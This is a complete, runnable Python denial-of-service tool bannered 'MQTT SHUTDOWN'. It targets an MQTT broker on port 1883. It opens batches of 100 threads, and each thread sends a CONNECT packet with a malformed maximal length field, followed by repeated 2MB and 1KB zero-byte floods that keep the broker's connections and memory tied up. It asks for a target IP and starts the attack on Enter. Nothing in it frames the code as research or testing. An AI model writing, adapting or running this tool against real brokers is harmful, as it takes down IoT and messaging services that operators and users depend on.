import socket
import threading
import time
import sys

# Global variables
host = ""
port = 1883
run = True
fails = 0
thclosed = 0
thcreated = 0
lock = threading.Lock()

# Payloads
initpayload = b"\x10\xff\xff\xff\x0f\x00\x04\x4d\x51\x54\x54\x04\x02\x00\x0a\x00\x10\x43\x36\x38\x4e\x30\x31\x77\x75\x73\x4a\x31\x66\x78\x75\x38\x58"
payload = b"\x00" * 2097152  # 2MB of zeros
keeppayload = b"\x00" * 1024  # 1KB of zeros


def sendAttack():
    """Function to send payloads to the target MQTT broker in a thread."""
    global fails, thclosed
    try:
        # Create and connect socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))

        # Send initial payload
        s.sendall(initpayload)

        # Send large payload 15 times with 0.1s delay
        for _ in range(15):
            s.sendall(payload)
            time.sleep(0.1)

        # Keep sending smaller payload until failure
        while True:
            s.sendall(keeppayload)
            time.sleep(0.3)
    except Exception as e:
        # Handle any socket-related errors
        with lock:
            fails += 1
        print(f"Exception in thread: {e}")
    finally:
        # Clean up socket
        try:
            s.shutdown(socket.SHUT_RDWR)
        except:
            pass
        s.close()
        with lock:
            thclosed += 1


# Main program
# Print banner with ANSI color codes
print(
    '\033[92m\n              ___\n             (  ">\n              )(\n             // ) MQTT SHUTDOWN\n          --//""--\n          -/------\n\033[39m\n'
)

# Get target IP from input or command-line argument
if len(sys.argv) < 2:
    host = input("Target IP: ")
else:
    host = sys.argv[1]
print(f"Using Target IP= {host}")

# Wait for user to start the attack
input("Press Enter to Start Attack\n")
print("Starting Attack\n")

# Main attack loop
while run:
    # Create 100 threads per batch
    for i in range(100):
        try:
            t = threading.Thread(target=sendAttack)
            t.start()
        except Exception as e:
            print(f"Failed to create thread: {e}")

    # Increment thread batch counter and wait
    with lock:
        thcreated += 1
    time.sleep(5)

    # Print status and check stopping condition
    with lock:
        live_threads = thcreated * 100 - thclosed - fails
        print("\n======Status=======\n")
        print(f"{thcreated * 100} threads created")
        print(f"{thclosed} closed threads")
        print(f"{fails} fails threads")
        print(f"{live_threads} running threads")
        if live_threads < 50:
            run = False

    # Wait before next batch
    time.sleep(55)

# Finish up
print("Attack finished...\n")
input()
